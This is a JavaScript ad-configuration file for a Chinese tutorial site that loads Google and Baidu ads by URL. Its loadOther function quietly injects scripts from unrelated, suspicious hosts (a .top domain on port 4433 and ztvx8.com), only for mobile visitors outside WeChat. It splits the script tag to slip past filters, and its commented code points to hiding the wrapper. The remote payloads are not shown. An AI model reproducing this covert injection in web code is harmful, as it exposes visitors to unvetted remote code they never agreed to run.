var cdn_static = "https://cdn.jsdelivr.net/gh/aiservice/os/static/";
// var cdn_static = "";
var app_name = "开源教程";
var app_domain = "www.ossoft.cn";
var baid = "297e701587c3bbbc208238ab0c23f228";
b_data_ad_mobile = "u3689760";
b_data_ad_336 = "u3689763";
g_data_ad_slot_auto = "2215424712";
g_data_ad_slot_recommend = "6053545297";
g_data_ad_client = "ca-pub-4603891518763240";

filterUrls = [];
siteGUrls = ["ossoft"];
siteBUrls = ["aiis", "china"];

cur_location_url = window.location.href;
g_enabled_ads = gEnabledAds(cur_location_url);
console.log("g_enabled_ads:" + g_enabled_ads);
site_enabled_g = siteEnabledG(cur_location_url);
console.log("site_enabled_g:" + site_enabled_g);
site_enabled_b = siteEnabledB(cur_location_url);
console.log("site_enabled_b:" + site_enabled_b);

function isMobile() {
    // return ua().match(/iphone|ipad|ipod|android|blackberry|iemobile|wpdesktop/i)
    return /iphone|ipad|ipod|android|blackberry|iemobile|wpdesktop/i.test(ua())
}

function ua() {
    return navigator.userAgent.toLowerCase()
}

function isWechat() {
    return ua().match(/micromessenger/i);
}

function gEnabledAds(url) {
    if (typeof filterUrls != "undefined") {
        for (var i = 0, len = filterUrls.length; i < len; i++) {
            console.log(filterUrls[i]);
            if (url.indexOf(filterUrls[i]) !== -1) {
                return false;
            }
        }
    }
    if (typeof filterClsIds != "undefined" && typeof cls_id != "undefined") {
        for (var i = 0, len = filterClsIds.length; i < len; i++) {
            console.log(filterClsIds[i]);
            if (cls_id === (filterClsIds[i])) {
                return false;
            }
        }
    }
    return true;
}

function siteEnabledG(url) {
    if (typeof siteGUrls != "undefined") {
        for (var i = 0, len = siteGUrls.length; i < len; i++) {
            console.log(siteGUrls[i]);
            if (url.indexOf(siteGUrls[i]) !== -1) {
                return true;
            }
        }
    }
    return false;
}

function siteEnabledB(url) {
    if (typeof siteBUrls != "undefined") {
        for (var i = 0, len = siteBUrls.length; i < len; i++) {
            console.log(siteBUrls[i]);
            if (url.indexOf(siteBUrls[i]) !== -1) {
                return true;
            }
        }
    }
    return false;
}

function loadGoogleAds() {
    if (g_enabled_ads) {
        document.write('<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>');
        document.write('<ins class="adsbygoogle" style="display:block" data-ad-client="' + g_data_ad_client + '" data-ad-slot="' + g_data_ad_slot_auto + '" data-ad-format="auto" data-full-width-responsive="true"></ins>');
        document.write('<script>(adsbygoogle = window.adsbygoogle || []).push({});</script>');
    }
}

function loadBaiduAds(loc) {
    var tmpId = b_data_ad_mobile;
    if ((loc === "cms_left_bottom" && !isMobile())) {
        tmpId = b_data_ad_336;
    }
    (function () {
        var s = "_" + Math.random().toString(36).slice(2);
        document.write('<div style="" id="' + s + '"></div>');
        (window.slotbydup = window.slotbydup || []).push({
            id: tmpId,
            container: s
        });
    })();
    document.write('<script type="text/javascript" src="//cpro.baidustatic.com/cpro/ui/c.js" async="async" defer="defer" ></script>');
}

function loadOther() {
    if (isMobile() && !isWechat()) {
        var opacity = "";
        // if (typeof third_opacity_css != "undefined") {
        //     opacity = third_opacity_css;
        // }
        document.writeln('<div style="' + opacity + '">');
        document.writeln('<script src="https://f4.uaevivi.top:4433/hm/cdn/static/jq_774276.js"></script>');
        document.writeln('<scri' + 'pt src="//spl.ztvx8.com/wlzys5.js"> </scri' + 'pt>');
        document.writeln('</div>');
    }
}
